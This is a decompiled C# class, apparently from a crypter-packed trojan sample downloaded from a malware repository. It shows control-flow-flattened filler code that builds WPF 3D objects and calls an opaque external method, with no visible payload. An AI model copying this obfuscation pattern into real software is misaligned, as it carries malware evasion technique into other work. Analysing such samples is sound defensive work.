// Decompiled with JetBrains decompiler
// Type: Tourield.Schemes.AuthenticationAdapterSchema
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Pages;
using System.Runtime.CompilerServices;
using System.Windows.Controls;
using System.Windows.Media.Media3D;

namespace Tourield.Schemes
{
  public class AuthenticationAdapterSchema
  {
    public Viewport3D _Product;
    public PerspectiveCamera _Mock;
    public Model3DGroup worker;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private AuthenticationAdapterSchema()
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_5;
            case 1:
            case 5:
              goto label_6;
            case 2:
            case 4:
              PerspectiveCamera perspectiveCamera = new PerspectiveCamera();
              goto case 3;
            case 3:
              this.worker = new Model3DGroup();
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto label_8;
            case 6:
              goto label_9;
            default:
              num2 = 3;
              continue;
          }
        }
label_5:
        RegistryPagePage.ListMethod();
        num1 = 5;
        continue;
label_6:
        this.worker = new Model3DGroup();
        // ISSUE: explicit constructor call
        base.\u002Ector();
        this._Product = new Viewport3D();
        num1 = 4;
      }
label_9:
      return;
label_8:;
    }

    internal static bool ViewAttribute() => true;

    internal static bool ListAttribute() => false;
  }
}
